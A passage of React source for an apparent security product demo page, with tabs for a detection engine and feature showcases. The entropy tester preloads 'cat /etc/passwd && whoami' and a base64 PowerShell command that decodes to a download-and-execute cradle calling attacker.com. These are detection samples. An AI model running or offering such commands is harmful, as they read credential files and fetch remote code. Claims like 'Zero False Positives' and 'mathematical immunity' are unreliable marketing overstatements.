                          {scenario.ml_score.is_anomaly ? 'ANOMALOUS BEHAVIOR' : 'WITHIN HISTORIC BASELINE'}
                        </span>
                      </div>
                    </div>

                    <div className="text-xs bg-black/50 p-2.5 rounded space-y-1">
                      <span className="text-slate-400 block font-bold text-[10px] uppercase">Forensic Evidence Summary:</span>
                      <p className="text-slate-300 text-xs font-mono">{scenario.ioc_match.detail}</p>
                    </div>
                  </div>
                )}
              </div>

              <button
                disabled={isPlaying}
                onClick={() => runSimulation(selectedKey)}
                className="w-full btn-primary py-2.5 text-xs font-bold flex items-center justify-center gap-2 font-mono"
              >
                <span>{isPlaying ? 'Processing Simulation Flow...' : '▶ Re-Run Simulation'}</span>
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* 5. INTERACTIVE DETECTION CORE STUDIO (NEW DEDICATED SECTION) */}
      <section id="detection-core" className="py-20 px-6 max-w-7xl mx-auto space-y-8">
        <div className="text-center space-y-3">
          <div className="inline-block text-xs font-mono uppercase text-accent bg-accent/10 px-3 py-1 rounded border border-accent/20">
            Real-Time Engine Deep Dive
          </div>
          <h2 className="text-3xl sm:text-5xl font-extrabold text-slate-100">
            Threat Analyser Detection Core
          </h2>
          <p className="text-slate-400 max-w-2xl mx-auto text-sm">
            Inspect how our four core detection sub-engines normalize, compile, evaluate, and score telemetry in sub-millisecond execution loops.
          </p>
        </div>

        {/* Tab Selector Deck */}
        <div className="flex flex-wrap justify-center gap-2 p-1.5 bg-base-900 border border-base-700 rounded-xl max-w-3xl mx-auto font-mono text-xs">
          <button
            onClick={() => setActiveCoreTab("ocsf")}
            className={`px-4 py-2 rounded-lg transition-all ${
              activeCoreTab === "ocsf" ? "bg-accent text-base-950 font-bold shadow-md" : "text-slate-400 hover:text-slate-200"
            }`}
          >
            1. OCSF Normalizer
          </button>
          <button
            onClick={() => setActiveCoreTab("sigma")}
            className={`px-4 py-2 rounded-lg transition-all ${
              activeCoreTab === "sigma" ? "bg-accent text-base-950 font-bold shadow-md" : "text-slate-400 hover:text-slate-200"
            }`}
          >
            2. Sigma Rule Compiler
          </button>
          <button
            onClick={() => setActiveCoreTab("ml")}
            className={`px-4 py-2 rounded-lg transition-all ${
              activeCoreTab === "ml" ? "bg-accent text-base-950 font-bold shadow-md" : "text-slate-400 hover:text-slate-200"
            }`}
          >
            3. ML Shannon Entropy
          </button>
          <button
            onClick={() => setActiveCoreTab("ioc")}
            className={`px-4 py-2 rounded-lg transition-all ${
              activeCoreTab === "ioc" ? "bg-accent text-base-950 font-bold shadow-md" : "text-slate-400 hover:text-slate-200"
            }`}
          >
            4. Threat Intel (IOC)
          </button>
          <button
            onClick={() => setActiveCoreTab("kms")}
            className={`px-4 py-2 rounded-lg transition-all ${
              activeCoreTab === "kms" ? "bg-accent text-base-950 font-bold shadow-md" : "text-slate-400 hover:text-slate-200"
            }`}
          >
            5. Zero-Trust KMS &amp; Ledger
          </button>
          <button
            onClick={() => setActiveCoreTab("v4")}
            className={`px-4 py-2 rounded-lg transition-all ${
              activeCoreTab === "v4" ? "bg-accent text-base-950 font-bold shadow-md" : "text-slate-400 hover:text-slate-200"
            }`}
          >
            6. eBPF &amp; Federated ML (v4)
          </button>
          <button
            onClick={() => setActiveCoreTab("v5")}
            className={`px-4 py-2 rounded-lg transition-all ${
              activeCoreTab === "v5" ? "bg-accent text-base-950 font-bold shadow-md" : "text-slate-400 hover:text-slate-200"
            }`}
          >
            7. Enclave &amp; Deception (v5)
          </button>
          <button
            onClick={() => setActiveCoreTab("v6")}
            className={`px-4 py-2 rounded-lg transition-all ${
              activeCoreTab === "v6" ? "bg-accent text-base-950 font-bold shadow-md" : "text-slate-400 hover:text-slate-200"
            }`}
          >
            8. FHE &amp; Autonomous AI (v6)
          </button>
          <button
            onClick={() => setActiveCoreTab("v7")}
            className={`px-4 py-2 rounded-lg transition-all ${
              activeCoreTab === "v7" ? "bg-accent text-base-950 font-bold shadow-md" : "text-slate-400 hover:text-slate-200"
            }`}
          >
            9. PQC &amp; Threat Twin (v7)
          </button>
        </div>





        {/* Dynamic Interactive Tab Content */}
        <div className="bg-base-900/90 border border-base-700 rounded-xl p-6 shadow-2xl">
          {/* TAB 1: OCSF NORMALIZER */}
          {activeCoreTab === "ocsf" && (
            <div className="space-y-6 animate-fade-in">
              <div className="flex flex-wrap items-center justify-between gap-4 border-b border-base-800 pb-4">
                <div>
                  <h3 className="text-lg font-bold text-slate-100 flex items-center gap-2">
                    <span className="text-accent">🛡</span>
                    <span>OCSF Schema Normalization Studio (v1.1.0)</span>
                  </h3>
                  <p className="text-xs text-slate-400">Maps unstructured Syslog, CEF, and JSON events into standard taxonomy classes.</p>
                </div>
                <div className="flex gap-2">
                  {OCSF_PRESETS.map((p, idx) => (
                    <button
                      key={idx}
                      onClick={() => setSelectedOcsfPreset(idx)}
                      className={`text-xs px-3 py-1.5 rounded font-mono border ${
                        selectedOcsfPreset === idx
                          ? "bg-accent/15 text-accent border-accent font-semibold"
                          : "bg-base-950 text-slate-400 border-base-800 hover:border-slate-700"
                      }`}
                    >
                      {p.title.split(' ')[0]}
                    </button>
                  ))}
                </div>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <div className="flex justify-between text-xs font-mono text-slate-400">
                    <span>RAW TELEMETRY INPUT</span>
                    <span className="text-slate-500">Unstructured</span>
                  </div>
                  <pre className="bg-base-950 border border-base-800 rounded-lg p-4 text-xs text-slate-300 font-mono overflow-x-auto whitespace-pre-wrap min-h-[220px]">
                    {OCSF_PRESETS[selectedOcsfPreset].raw}
                  </pre>
                </div>

                <div className="space-y-2">
                  <div className="flex justify-between text-xs font-mono text-slate-400">
                    <span className="text-accent">STANDARDIZED OCSF JSON TREE</span>
                    <span className="text-cyan-400">Class UID: {OCSF_PRESETS[selectedOcsfPreset].ocsf.class_uid}</span>
                  </div>
                  <pre className="bg-base-950 border border-base-800 rounded-lg p-4 text-xs text-emerald-400 font-mono overflow-x-auto max-h-[300px]">
                    {JSON.stringify(OCSF_PRESETS[selectedOcsfPreset].ocsf, null, 2)}
                  </pre>
                </div>
              </div>
            </div>
          )}

          {/* TAB 2: SIGMA RULE COMPILER */}
          {activeCoreTab === "sigma" && (
            <div className="space-y-6 animate-fade-in">
              <div className="flex flex-wrap items-center justify-between gap-4 border-b border-base-800 pb-4">
                <div>
                  <h3 className="text-lg font-bold text-slate-100 flex items-center gap-2">
                    <span className="text-amber-400">⚙</span>
                    <span>Sigma Rule Compiler &amp; Heuristics Evaluator</span>
                  </h3>
                  <p className="text-xs text-slate-400">Translates standard Sigma YAML definitions into high-speed Python boolean matching ASTs.</p>
                </div>
                <div className="flex gap-2">
                  {SIGMA_RULES_PRESETS.map((p, idx) => (
                    <button
                      key={idx}
                      onClick={() => setSelectedSigmaPreset(idx)}
                      className={`text-xs px-3 py-1.5 rounded font-mono border ${
                        selectedSigmaPreset === idx
                          ? "bg-amber-500/15 text-amber-300 border-amber-500 font-semibold"
                          : "bg-base-950 text-slate-400 border-base-800 hover:border-slate-700"
                      }`}
                    >
                      {p.title.split(' ')[0]}
                    </button>
                  ))}
                </div>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <div className="flex justify-between text-xs font-mono text-slate-400">
                    <span className="text-amber-300">SIGMA RULE SOURCE (YAML)</span>
                    <span className="text-slate-500">Declarative</span>
                  </div>
                  <pre className="bg-base-950 border border-base-800 rounded-lg p-4 text-xs text-slate-300 font-mono overflow-x-auto max-h-[300px]">
                    {SIGMA_RULES_PRESETS[selectedSigmaPreset].yaml}
                  </pre>
                </div>

                <div className="space-y-4">
                  <div className="space-y-2">
                    <span className="text-xs font-mono text-slate-400 block">EVALUATION TARGET TELEMETRY</span>
                    <pre className="bg-base-950 border border-base-800 rounded-lg p-3 text-xs text-cyan-300 font-mono overflow-x-auto">
                      {SIGMA_RULES_PRESETS[selectedSigmaPreset].targetLog}
                    </pre>
                  </div>

                  <div className="p-4 bg-rose-950/20 border border-rose-700/50 rounded-lg space-y-2 font-mono text-xs">
                    <div className="flex items-center justify-between text-rose-400 font-bold">
                      <span>COMPILER VERDICT:</span>
                      <span className="bg-rose-500/20 px-2 py-0.5 rounded border border-rose-500/40">TRIGGER INCIDENT</span>
                    </div>
                    <p className="text-slate-300">{SIGMA_RULES_PRESETS[selectedSigmaPreset].verdict}</p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* TAB 3: ML SHANNON ENTROPY */}
          {activeCoreTab === "ml" && (
            <div className="space-y-6 animate-fade-in">
              <div className="border-b border-base-800 pb-4">
                <h3 className="text-lg font-bold text-slate-100 flex items-center gap-2">
                  <span className="text-purple-400">◈</span>
                  <span>Unsupervised ML Shannon Entropy &amp; Isolation Scorer</span>
                </h3>
                <p className="text-xs text-slate-400">Type or paste any command-line string to watch entropy analysis and anomaly probability compute live.</p>
              </div>

              <div className="space-y-4">
                <div>
                  <div className="flex justify-between items-center mb-1 text-xs font-mono">
                    <label className="text-slate-400">TEST COMMAND / PAYLOAD STRING</label>
                    <div className="flex gap-2 text-[11px]">
                      <button
                        onClick={() => setMlTestString("cat /etc/passwd && whoami")}
                        className="text-slate-400 hover:text-accent underline"
                      >
                        [Normal Payload]
                      </button>
                      <button
                        onClick={() => setMlTestString("powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0 ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA")}
                        className="text-rose-400 hover:underline"
                      >
                        [Obfuscated Base64]
                      </button>
                    </div>
                  </div>
                  <textarea
                    rows={3}
                    className="input-field text-xs font-mono"
                    value={mlTestString}
                    onChange={(e) => setMlTestString(e.target.value)}
                  />
                </div>

                {/* Real-time Math Score Metrics */}
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 bg-base-950 p-4 rounded-lg border border-base-800 font-mono text-xs">
                  <div>
                    <span className="text-slate-500 block text-[10px] uppercase">Shannon Information Entropy</span>
                    <span className={`text-xl font-bold ${isHighEntropy ? "text-rose-400" : "text-emerald-400"}`}>
                      {currentEntropy} <span className="text-xs font-normal text-slate-500">bits</span>
                    </span>
                    <span className="text-[10px] text-slate-500 block mt-0.5">
                      {isHighEntropy ? "⚠️ High Randomness / Obfuscated" : "✔ Normal linguistic distribution"}
                    </span>
                  </div>

                  <div>
                    <span className="text-slate-500 block text-[10px] uppercase">Payload Byte Length</span>
                    <span className="text-xl font-bold text-cyan-400">{mlTestString.length} chars</span>
                    <span className="text-[10px] text-slate-500 block mt-0.5">Statistical payload density feature</span>
                  </div>

                  <div>
                    <span className="text-slate-500 block text-[10px] uppercase">Isolation Forest Score</span>
                    <span className={`text-xl font-bold ${calculatedMlScore > 0.6 ? "text-rose-400" : "text-emerald-400"}`}>
                      {(calculatedMlScore * 100).toFixed(1)}%
                    </span>
                    <span className="text-[10px] text-slate-500 block mt-0.5">
                      {calculatedMlScore > 0.6 ? "🚨 Behavioral Anomaly Alert" : "Conforming historic profile"}
                    </span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* TAB 4: THREAT INTEL (IOC) */}
          {activeCoreTab === "ioc" && (
            <div className="space-y-6 animate-fade-in">
              <div className="border-b border-base-800 pb-4">
                <h3 className="text-lg font-bold text-slate-100 flex items-center gap-2">
                  <span className="text-cyan-400">◎</span>
                  <span>Threat Intelligence Indicator (IOC) Matcher</span>
                </h3>
                <p className="text-xs text-slate-400">Search against curated global and tenant-specific threat indices in sub-millisecond lookups.</p>
              </div>

              <div className="space-y-4">
                <div className="flex gap-2">
                  <input
                    className="input-field text-xs font-mono flex-1"
                    placeholder="Enter IP, domain, or SHA256 hash (e.g. 185.220.101.5, 45.155.205.233, attacker.com)..."
                    value={iocSearchInput}
                    onChange={(e) => setIocSearchInput(e.target.value)}
                  />
                  <button
                    onClick={() => handleIocSearch(iocSearchInput)}
                    className="btn-primary text-xs px-5 py-2 font-mono font-bold"
                  >
                    Scan Feed
                  </button>
                </div>

                <div className="flex items-center gap-2 text-xs font-mono text-slate-400">
                  <span className="text-slate-500 text-[11px]">Quick Tests:</span>
                  <button onClick={() => { setIocSearchInput("185.220.101.5"); handleIocSearch("185.220.101.5"); }} className="text-rose-400 hover:underline">185.220.101.5</button>
                  <button onClick={() => { setIocSearchInput("45.155.205.233"); handleIocSearch("45.155.205.233"); }} className="text-rose-400 hover:underline">45.155.205.233</button>
                  <button onClick={() => { setIocSearchInput("attacker.com"); handleIocSearch("attacker.com"); }} className="text-rose-400 hover:underline">attacker.com</button>
                  <button onClick={() => { setIocSearchInput("8.8.8.8"); handleIocSearch("8.8.8.8"); }} className="text-emerald-400 hover:underline">8.8.8.8 (Clean)</button>
                </div>

                {iocLookupResult && (
                  <div className={`p-4 rounded-lg border font-mono text-xs space-y-2 ${
                    iocLookupResult.matched ? "bg-rose-950/20 border-rose-600/60" : "bg-emerald-950/20 border-emerald-600/60"
                  }`}>
                    <div className="flex justify-between items-center">
                      <span className="font-bold text-sm text-slate-200">Indicator: {iocLookupResult.key}</span>
                      <span className={`px-2 py-0.5 rounded font-bold text-[10px] ${
                        iocLookupResult.matched ? "bg-rose-500/20 text-rose-300 border border-rose-500/40" : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40"
                      }`}>
                        {iocLookupResult.severity}
                      </span>
                    </div>
                    <p className="text-slate-300 font-sans text-xs">{iocLookupResult.desc}</p>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* TAB 5: ZERO-TRUST KMS & MERKLE LEDGER */}
          {activeCoreTab === "kms" && (
            <div className="space-y-6 animate-fade-in font-mono text-xs">
              <div className="border-b border-base-800 pb-4">
                <h3 className="text-lg font-bold text-slate-100 flex items-center gap-2">
                  <span className="text-emerald-400">🔒</span>
                  <span>Zero-Trust Multi-Tenant KMS &amp; Merkle Ledger (v3.0)</span>
                </h3>
                <p className="text-xs text-slate-400 font-sans">
                  Bring Your Own Key (BYOK) AES-256 GCM envelope encryption paired with RFC 6962 tamper-evident Merkle hash chain.
                </p>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {/* KMS Envelope Encryption Studio */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-emerald-400 font-bold">1. BYOK Envelope Encryption</span>
                    <span className="text-slate-500 text-[10px]">AES-256-GCM</span>
                  </div>

                  <div className="space-y-2">
                    <label className="text-slate-400 block text-[11px]">Owner Tenant ID:</label>
                    <div className="flex gap-2">
                      <button
                        onClick={() => setKmsTargetOrg("tenant-alpha")}
                        className={`px-2.5 py-1 rounded border text-[11px] ${kmsTargetOrg === "tenant-alpha" ? "bg-emerald-500/20 text-emerald-300 border-emerald-500" : "bg-base-900 text-slate-400 border-base-700"}`}
                      >
                        tenant-alpha
                      </button>
                      <button
                        onClick={() => setKmsTargetOrg("tenant-bravo")}
                        className={`px-2.5 py-1 rounded border text-[11px] ${kmsTargetOrg === "tenant-bravo" ? "bg-emerald-500/20 text-emerald-300 border-emerald-500" : "bg-base-900 text-slate-400 border-base-700"}`}
                      >
                        tenant-bravo
                      </button>
                    </div>
                  </div>

                  <div className="space-y-1">
                    <span className="text-slate-400 block text-[11px]">Plaintext Log Payload:</span>
                    <textarea
                      rows={2}
                      className="input-field text-xs"
                      value={kmsPayload}
                      onChange={(e) => setKmsPayload(e.target.value)}
                    />
                  </div>

                  <div className="p-3 bg-base-900 border border-base-800 rounded space-y-1 text-[11px]">
                    <div className="text-slate-400">Encrypted Ciphertext (Stored in DB):</div>
                    <code className="text-cyan-300 block truncate">
                      {"tK8v...AES256GCM..." + btoa(kmsPayload + kmsTargetOrg).slice(0, 36) + "=="}
                    </code>
                    <div className="text-slate-500 text-[10px]">Wrapped DEK: KEK-{kmsTargetOrg}-wrapped-key</div>
                  </div>

                  {/* Cross-Tenant Decryption Test */}
                  <div className="pt-2 border-t border-base-800 space-y-2">
                    <div className="flex justify-between items-center text-[11px]">
                      <span className="text-slate-400">Attempt Decryption As:</span>
                      <div className="flex gap-2">
                        <button
                          onClick={() => setKmsDecryptAttemptOrg("tenant-alpha")}
                          className={`px-2 py-0.5 rounded border text-[10px] ${kmsDecryptAttemptOrg === "tenant-alpha" ? "bg-cyan-950 text-cyan-300 border-cyan-700" : "bg-base-900 text-slate-400 border-base-700"}`}
                        >
                          tenant-alpha
                        </button>
                        <button
                          onClick={() => setKmsDecryptAttemptOrg("tenant-bravo")}
                          className={`px-2 py-0.5 rounded border text-[10px] ${kmsDecryptAttemptOrg === "tenant-bravo" ? "bg-cyan-950 text-cyan-300 border-cyan-700" : "bg-base-900 text-slate-400 border-base-700"}`}
                        >
                          tenant-bravo (Intruder)
                        </button>
                      </div>
                    </div>

                    <div className={`p-2.5 rounded border text-[11px] ${
                      kmsTargetOrg === kmsDecryptAttemptOrg
                        ? "bg-emerald-950/60 border-emerald-700 text-emerald-300"
                        : "bg-rose-950/80 border-rose-600 text-rose-300 font-bold"
                    }`}>
                      {kmsTargetOrg === kmsDecryptAttemptOrg ? (
                        <div>✔ DECRYPT SUCCESS: {kmsPayload}</div>
                      ) : (
                        <div>⛔ ACCESS DENIED: PermissionError: Cross-tenant DEK unwrapping strictly prohibited. Zero-Trust boundary held.</div>
                      )}
                    </div>
                  </div>
                </div>

                {/* Merkle Hash Chain Studio */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-cyan-400 font-bold">2. Merkle Audit Hash-Chain</span>
                    <span className="text-slate-500 text-[10px]">RFC 6962</span>
                  </div>

                  <div className="flex justify-between items-center text-[11px]">
                    <span className="text-slate-400">Sequential Audit Blocks:</span>
                    <button
                      onClick={() => setKmsTamperBlockIndex(kmsTamperBlockIndex === 1 ? null : 1)}
                      className={`px-2 py-0.5 rounded border text-[10px] ${
                        kmsTamperBlockIndex === 1
                          ? "bg-rose-950 text-rose-300 border-rose-700"
                          : "bg-amber-950 text-amber-300 border-amber-700"
                      }`}
                    >
                      {kmsTamperBlockIndex === 1 ? "Undo Tampering" : "⚡ Inject Tampered Row"}
                    </button>
                  </div>

                  <div className="space-y-2">
                    {[
                      { index: 0, action: "register", user: "admin@corp.io", seal: "a21aa90c76c2..." },
                      { index: 1, action: kmsTamperBlockIndex === 1 ? "MALICIOUS_UNAUTHORIZED_MUTATION" : "device_created", user: "admin@corp.io", seal: kmsTamperBlockIndex === 1 ? "BROKEN_SEAL_MISMATCH" : "e94fc11a8b90..." },
                      { index: 2, action: "soar_mitigate", user: "soc_analyst@corp.io", seal: "062d09635dba..." },
                    ].map((b) => (
                      <div
                        key={b.index}
                        className={`p-2 rounded border text-[11px] ${
                          kmsTamperBlockIndex === 1 && b.index >= 1
                            ? "bg-rose-950/40 border-rose-700 text-rose-300"
                            : "bg-base-900 border-base-800 text-slate-300"
                        }`}
                      >
                        <div className="flex justify-between text-[10px] text-slate-400 mb-0.5">
                          <span>Block #{b.index} • Action: <strong className="text-slate-200">{b.action}</strong></span>
                          <span>Actor: {b.user}</span>
                        </div>
                        <div className="text-[10px] text-slate-500 truncate">
                          SHA-256 Seal: <code className={kmsTamperBlockIndex === 1 && b.index >= 1 ? "text-rose-400 font-bold" : "text-emerald-400"}>{b.seal}</code>
                        </div>
                      </div>
                    ))}
                  </div>

                  <div className={`p-2.5 rounded border text-[11px] ${
                    kmsTamperBlockIndex === 1
                      ? "bg-rose-950/80 border-rose-600 text-rose-300 font-bold"
                      : "bg-emerald-950/60 border-emerald-700 text-emerald-300"
                  }`}>
                    {kmsTamperBlockIndex === 1 ? (
                      <div>❌ TAMPERING DETECTED: Hash chain broken at Block #1. Expected cryptographic seal mismatch.</div>
                    ) : (
                      <div>✅ MERKLE INTEGRITY VERIFIED: All SHA-256 chained blocks mathematically validated.</div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* TAB 6: V4 INNOVATIONS (eBPF, FEDERATED ML, AI SOAR, zk-SNARKs) */}
          {activeCoreTab === "v4" && (
            <div className="space-y-6 animate-fade-in font-mono text-xs">
              <div className="border-b border-base-800 pb-4">
                <h3 className="text-lg font-bold text-slate-100 flex items-center gap-2">
                  <span className="text-indigo-400">⚡</span>
                  <span>Version 4.0 Paradigm: Kernel eBPF, Federated ML &amp; zk-SNARKs</span>
                </h3>
                <p className="text-xs text-slate-400 font-sans">
                  Next-generation autonomous security architecture combining kernel-level syscall tracing, privacy-preserving threat federation, and zero-knowledge compliance proofs.
                </p>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {/* 1. In-Kernel eBPF Tracepoint Visualizer */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-cyan-400 font-bold">1. Linux Kernel eBPF Probes</span>
                    <span className="text-[10px] bg-cyan-950 text-cyan-300 px-2 py-0.5 rounded border border-cyan-800">RingBuf 1MB</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Sandboxed Rust/Aya in-kernel probes intercept syscalls at ring 0, eliminating user-space log tampering.
                  </p>
                  <pre className="bg-base-900 border border-base-800 rounded p-3 text-[11px] text-cyan-300 overflow-x-auto">
{`[KERNEL:sys_enter_execve] PID: 4892 UID: 0 (root)
  -> Binary: /usr/bin/python3
  -> In-Memory RingBuffer: Zero-copy lockless queue
  -> Output: OCSF Class UID: 1007 (Process Activity)`}
                  </pre>
                  <div className="p-2 bg-emerald-950/40 border border-emerald-800/60 rounded text-[11px] text-emerald-300">
                    ✔ Un-bypassable telemetry: Protected against local root /var/log erasure.
                  </div>
                </div>

                {/* 2. Federated Threat Intelligence */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-indigo-400 font-bold">2. Federated ML (Differential Privacy)</span>
                    <span className="text-[10px] bg-indigo-950 text-indigo-300 px-2 py-0.5 rounded border border-indigo-800">FedAvg (ε=0.5)</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Collaborative threat intelligence across tenant boundaries. Shares averaged mathematical parameters without exposing raw customer records.
                  </p>
                  <div className="grid grid-cols-3 gap-2 text-center text-[10px]">
                    <div className="p-2 bg-base-900 border border-base-800 rounded">
                      <span className="text-slate-500 block uppercase">Tenant Nodes</span>
                      <strong className="text-slate-200">3 Isolated Orgs</strong>
                    </div>
                    <div className="p-2 bg-base-900 border border-base-800 rounded">
                      <span className="text-slate-500 block uppercase">Privacy Budget</span>
                      <strong className="text-cyan-300">Laplace ε=0.5</strong>
                    </div>
                    <div className="p-2 bg-base-900 border border-base-800 rounded">
                      <span className="text-slate-500 block uppercase">Convergence</span>
                      <strong className="text-emerald-400">96.4% Accuracy</strong>
                    </div>
                  </div>
                  <div className="p-2 bg-indigo-950/40 border border-indigo-800/60 rounded text-[11px] text-indigo-300">
                    ✔ Privacy guarantee: Mathematical immunity against model inversion attacks.
                  </div>
                </div>

                {/* 3. Cognitive AI SOAR Playbook */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-purple-400 font-bold">3. Cognitive AI-SOAR Synthesis</span>
                    <span className="text-[10px] bg-purple-950 text-purple-300 px-2 py-0.5 rounded border border-purple-800">Dynamic JSON</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Dynamically generates context-aware containment playbooks based on MITRE progression and historical actions.
                  </p>
                  <pre className="bg-base-900 border border-base-800 rounded p-2.5 text-[10px] text-emerald-400 overflow-x-auto">
{`{
  "engine": "Threat-Reasoner-v4-Cognitive",
  "risk_mitigation_score": 0.96,
  "orchestrated_actions": [
    { "step": 1, "action": "isolate_endpoint", "target": "prod-db-01" },
    { "step": 2, "action": "terminate_process", "target": "powershell.exe" },
    { "step": 3, "action": "revoke_session_tokens", "target": "service_account" }
  ]
}`}
                  </pre>
                </div>

                {/* 4. zk-SNARK Zero-Knowledge Compliance */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-emerald-400 font-bold">4. Zero-Knowledge SLA Proofs</span>
                    <span className="text-[10px] bg-emerald-950 text-emerald-300 px-2 py-0.5 rounded border border-emerald-800">Groth16 / BN254</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Prove SOC 2 Type II / ISO 27001 SLA satisfaction to external auditors mathematically without disclosing IP addresses or usernames.
                  </p>
                  <div className="p-3 bg-base-900 border border-base-800 rounded space-y-1 text-[10px]">
                    <div>Proof π_A: <code className="text-cyan-300">0x8f3b207a93c72e90c8a...</code></div>
                    <div>Audit Claim: <strong className="text-slate-200">100% Critical SLAs Triaged &lt; 15 min</strong></div>
                    <div className="text-emerald-400 font-bold">✔ Auditor Verdict: MATHEMATICALLY_PROVEN_COMPLIANT</div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* TAB 7: V5 INNOVATIONS (CONFIDENTIAL ENCLAVES, SSE S3, ACTIVE DECEPTION, PROVENANCE DAGs, BAS) */}
          {activeCoreTab === "v5" && (
            <div className="space-y-6 animate-fade-in font-mono text-xs">
              <div className="border-b border-base-800 pb-4">
                <h3 className="text-lg font-bold text-slate-100 flex items-center gap-2">
                  <span className="text-rose-400">🛡️</span>
                  <span>Version 5.0 Vanguard: Confidential Enclaves, Active Deception &amp; Provenance DAGs</span>
                </h3>
                <p className="text-xs text-slate-400 font-sans">
                  The "99/100 Architectural Score" tier: In-memory hardware enclaves (Intel SGX / AMD SEV), searchable cold storage encryption (SSE), and active adversary deception.
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* 1. Hardware-Attested Secure Enclaves */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-cyan-400 font-bold">1. Hardware Secure Enclaves (SGX / SEV)</span>
                    <span className="text-[10px] bg-cyan-950 text-cyan-300 px-2 py-0.5 rounded border border-cyan-800">PRM Isolated</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    In-memory decryption, OCSF normalization, and PII masking strictly in Processor Reserved Memory. Zero exposure to cloud hosting providers or host root admins.
                  </p>
                  <div className="p-2.5 bg-base-900 border border-base-800 rounded text-[11px] text-slate-300 space-y-1">
                    <div>Attestation: <span className="text-emerald-400 font-bold">MRENCLAVE Validated</span></div>
                    <div>PII Masking: <code className="text-amber-300">[MASKED_EMAIL] / [REDACTED_SECRET]</code></div>
                  </div>
                </div>

                {/* 2. Cryptographic Searchable Archives (SSE) */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-emerald-400 font-bold">2. Searchable Symmetric Encryption (SSE)</span>
                    <span className="text-[10px] bg-emerald-950 text-emerald-300 px-2 py-0.5 rounded border border-emerald-800">S3 / Parquet</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Sub-millisecond threat hunting over cold encrypted S3 archives using deterministic HMAC search tokens without decrypting bulk multi-gigabyte files.
                  </p>
                  <div className="p-2.5 bg-base-900 border border-base-800 rounded text-[11px] text-slate-300 space-y-1">
                    <div>Token: <code className="text-cyan-300">0x4a9e8f... (HMAC-SHA256)</code></div>
                    <div>Search Latency: <strong className="text-emerald-400">&lt; 15ms per million rows</strong></div>
                  </div>
                </div>

                {/* 3. Active Deception & Honey-Tokens */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-rose-400 font-bold">3. Managed Honey-Tokens &amp; Decoys</span>
                    <span className="text-[10px] bg-rose-950 text-rose-300 px-2 py-0.5 rounded border border-rose-800">Active Deception</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Non-functional but realistic decoy AWS keys, registry keys, and SSH credentials deployed on devices. Interaction triggers instant automated SOAR lockdown.
                  </p>
                  <div className="p-2.5 bg-rose-950/40 border border-rose-850 rounded text-[11px] text-rose-300 space-y-1">
                    <div>Guarantee: <strong className="text-rose-200">Zero False Positives</strong></div>
                    <div>Trigger SLA: <strong className="text-rose-200">Instant Endpoint Isolation</strong></div>
                  </div>
                </div>

                {/* 4. Provenance DAGs & Continuous BAS */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-purple-400 font-bold">4. Provenance DAGs &amp; Automated BAS</span>
                    <span className="text-[10px] bg-purple-950 text-purple-300 px-2 py-0.5 rounded border border-purple-800">Atomic Red Team</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    System call lineage graphs trace incidents back to Patient Zero, while continuous atomic red-team loops guarantee detection SLA coverage.
                  </p>
                  <div className="p-2.5 bg-base-900 border border-base-800 rounded text-[11px] text-slate-300 space-y-1">
                    <div>Backtrace: <strong className="text-cyan-300">Target ➔ Reverse Shell ➔ Patient Zero</strong></div>
                    <div>BAS Validation: <strong className="text-emerald-400">100% Pipeline Coverage Tested</strong></div>
                  </div>
                </div>
              </div>
            </div>
          )}

